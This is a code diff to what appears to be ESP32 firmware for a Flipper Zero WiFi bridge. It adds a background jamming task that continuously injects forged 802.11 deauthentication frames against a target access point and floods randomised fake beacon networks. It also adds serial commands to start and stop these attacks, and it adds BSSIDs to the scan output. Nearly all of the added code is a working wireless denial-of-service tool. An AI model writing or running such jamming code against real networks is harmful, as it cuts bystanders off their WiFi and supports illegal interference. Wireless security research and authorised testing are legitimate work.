@@ -148,6 +148,79 @@ void handle_download(const char* url) {
     Serial.printf("Download complete, sent %d bytes\n", contentLength - remaining);
 }
 
+enum JammingMode {
+    JAM_NONE,
+    JAM_DEAUTH,
+    JAM_BEACON
+};
+
+static JammingMode current_jam_mode = JAM_NONE;
+static uint8_t target_bssid[6];
+static String beacon_prefix = "FLIP_";
+static int beacon_count = 15;
+static TaskHandle_t jammingTaskHandle = NULL;
+
+void jamming_task(void* pvParameters) {
+    while (true) {
+        if (current_jam_mode == JAM_DEAUTH) {
+            uint8_t deauth_frame[26] = {
+                0xC0, 0x00, 0x00, 0x00,
+                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x07, 0x00
+            };
+            memcpy(deauth_frame + 10, target_bssid, 6);
+            memcpy(deauth_frame + 16, target_bssid, 6);
+            
+            for(int i=0; i<5; i++) {
+                esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+                delay(5);
+            }
+        } else if (current_jam_mode == JAM_BEACON) {
+            for (int i = 0; i < beacon_count; i++) {
+                uint8_t mac[6];
+                for(int j=0; j<6; j++) mac[j] = random(256);
+                mac[0] = 0x02; // Local admin MAC
+
+                String ssid = beacon_prefix + String(random(1000, 9999));
+                uint8_t ssid_len = ssid.length();
+
+                uint8_t beacon_frame[128] = {
+                    0x80, 0x00, 0x00, 0x00,
+                    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest: Broadcast
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src: Random
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Random
+                    0x00, 0x00, // Seq
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
+                    0x64, 0x00, // Beacon interval
+                    0x11, 0x04, // Capability info
+                    0x00, ssid_len // SSID tag
+                };
+                memcpy(beacon_frame + 10, mac, 6);
+                memcpy(beacon_frame + 16, mac, 6);
+                memcpy(beacon_frame + 38, ssid.c_str(), ssid_len);
+                
+                size_t frame_len = 38 + ssid_len;
+                // Supported rates tag
+                beacon_frame[frame_len++] = 0x01;
+                beacon_frame[frame_len++] = 0x08;
+                memcpy(beacon_frame + frame_len, "\x82\x84\x8b\x96\x24\x30\x48\x6c", 8);
+                frame_len += 8;
+                // DS Parameter Set (Channel)
+                beacon_frame[frame_len++] = 0x03;
+                beacon_frame[frame_len++] = 0x01;
+                beacon_frame[frame_len++] = (uint8_t)random(1, 12);
+
+                esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_len, false);
+                delay(2);
+            }
+        }
+        delay(10);
+        yield();
+    }
+}
+
 void handle_command(String& cmd) {
     cmd.trim();
     if (cmd.length() == 0) return;
@@ -195,6 +268,7 @@ void handle_command(String& cmd) {
         send_response("OK");
     } else if (cmd == "WIFI_SCAN") {
         Serial.println("Scanning WiFi networks...");
+        current_jam_mode = JAM_NONE;
         int n = WiFi.scanNetworks();
         if (n < 0) {
             send_response("ERROR:Scan failed");
@@ -203,80 +277,83 @@ void handle_command(String& cmd) {
 
         for (int i = 0; i < n; i++) {
             char line[128];
-            snprintf(line, sizeof(line), "%ddBm|CH%d|%s|%s",
+            snprintf(line, sizeof(line), "%ddBm|CH%d|%s|%s|%s",
                 WiFi.RSSI(i),
                 WiFi.channel(i),
                 (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "OPEN" : "LOCKED",
+                WiFi.BSSIDstr(i).c_str(),
                 WiFi.SSID(i).c_str());
             send_response(line);
         }
 
         WiFi.scanDelete();
         send_response("DONE");
-    } else if (cmd.startsWith("WIFI_DEAUTH ")) {
-        // Deauth requires raw 802.11 frame injection
-        // Parse: WIFI_DEAUTH <bssid> [count]
-        String args = cmd.substring(12);
-        args.trim();
-
-        int spaceIdx = args.indexOf(' ');
-        String bssidStr;
-        int count = 50;
-
-        if (spaceIdx > 0) {
-            bssidStr = args.substring(0, spaceIdx);
-            count = args.substring(spaceIdx + 1).toInt();
-            if (count <= 0) count = 50;
-            if (count > 500) count = 500;
-        } else {
-            bssidStr = args;
-        }
-
-        // Parse MAC address
-        uint8_t bssid[6];
+    } else if (cmd.startsWith("WIFI_DEAUTH_START ")) {
+        String bssidStr = cmd.substring(18);
+        bssidStr.trim();
         int parsed = sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+            &target_bssid[0], &target_bssid[1], &target_bssid[2], &target_bssid[3], &target_bssid[4], &target_bssid[5]);
 
         if (parsed != 6) {
-            send_response("ERROR:Invalid BSSID format (XX:XX:XX:XX:XX:XX)");
+            send_response("ERROR:Invalid BSSID");
             return;
         }
 
-        // Deauth frame template (IEEE 802.11)
-        uint8_t deauth_frame[26] = {
-            0xC0, 0x00,                         // Frame Control: Deauthentication
-            0x00, 0x00,                         // Duration
-            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: target BSSID
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: target
-            0x00, 0x00,                         // Sequence number
-            0x07, 0x00                          // Reason: Class 3 frame from nonassociated STA
-        };
-
-        // Set source and BSSID to target AP
-        memcpy(deauth_frame + 10, bssid, 6);
-        memcpy(deauth_frame + 16, bssid, 6);
-
-        // Need to be in promiscuous mode for raw frame injection
         esp_wifi_set_mode(WIFI_MODE_STA);
         esp_wifi_start();
         esp_wifi_set_promiscuous(true);
-
-        int sent = 0;
-        for (int i = 0; i < count; i++) {
-            deauth_frame[22] = (i & 0xFF);
-            deauth_frame[23] = ((i >> 8) & 0x0F);
-            if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false) == ESP_OK) {
-                sent++;
-            }
-            delay(2);
-        }
-
+        current_jam_mode = JAM_DEAUTH;
+        send_response("JAMMING_STARTED");
+    } else if (cmd == "WIFI_JAM_STOP") {
+        current_jam_mode = JAM_NONE;
         esp_wifi_set_promiscuous(false);
-
-        char result[64];
-        snprintf(result, sizeof(result), "Sent %d/%d deauth frames", sent, count);
-        send_response(result);
+        send_response("STOPPED");
+    } else if (cmd.startsWith("WIFI_BEACON_START ")) {
+        // WIFI_BEACON_START <prefix> <count>
+        String args = cmd.substring(18);
+        int spaceIdx = args.indexOf(' ');
+        if (spaceIdx > 0) {
+            beacon_prefix = args.substring(0, spaceIdx);
+            beacon_count = args.substring(spaceIdx + 1).toInt();
+        } else {
+            beacon_prefix = args;
+            beacon_count = 15;
+        }
+        
+        esp_wifi_set_mode(WIFI_MODE_STA);
+        esp_wifi_start();
+        esp_wifi_set_promiscuous(true);
+        current_jam_mode = JAM_BEACON;
+        send_response("FLOOD_STARTED");
+    } else if (cmd.startsWith("WIFI_DEAUTH ")) {
+        // Legacy deauth support
+        String bssidStr = cmd.substring(12);
+        bssidStr.trim();
+        int parsed = sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+            &target_bssid[0], &target_bssid[1], &target_bssid[2], &target_bssid[3], &target_bssid[4], &target_bssid[5]);
+        
+        if (parsed == 6) {
+            esp_wifi_set_mode(WIFI_MODE_STA);
+            esp_wifi_start();
+            esp_wifi_set_promiscuous(true);
+            uint8_t deauth_frame[26] = {
+                0xC0, 0x00, 0x00, 0x00,
+                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x07, 0x00
+            };
+            memcpy(deauth_frame + 10, target_bssid, 6);
+            memcpy(deauth_frame + 16, target_bssid, 6);
+            for(int i=0; i<50; i++) {
+                esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+                delay(5);
+            }
+            esp_wifi_set_promiscuous(false);
+            send_response("Sent 50 deauth frames");
+        } else {
+            send_response("ERROR:Invalid BSSID");
+        }
     } else if (cmd.startsWith("DOWNLOAD ")) {
         String url = cmd.substring(9);
         url.trim();
@@ -286,21 +363,27 @@ void handle_command(String& cmd) {
     }
 }
 
+void setup() {
+    Serial.begin(115200);
+    FLIPPER_SERIAL.begin(FLIPPER_BAUD, SERIAL_8N1, FLIPPER_RX_PIN, FLIPPER_TX_PIN);
+    WiFi.mode(WIFI_STA);
+    
+    xTaskCreate(jamming_task, "jamming_task", 4096, NULL, 1, &jammingTaskHandle);
+    
+    Serial.println("Flipped WiFi Bridge starting...");
+    Serial.println("Ready for commands");
+}
+
 void loop() {
     static String inputBuffer = "";
-
     while (FLIPPER_SERIAL.available()) {
         char c = FLIPPER_SERIAL.read();
-
         if (c == '\n') {
             handle_command(inputBuffer);
             inputBuffer = "";
         } else if (c != '\r') {
-            if (inputBuffer.length() < 1024) {
-                inputBuffer += c;
-            }
+            if (inputBuffer.length() < 1024) inputBuffer += c;
         }
     }
-
     delay(1);
 }
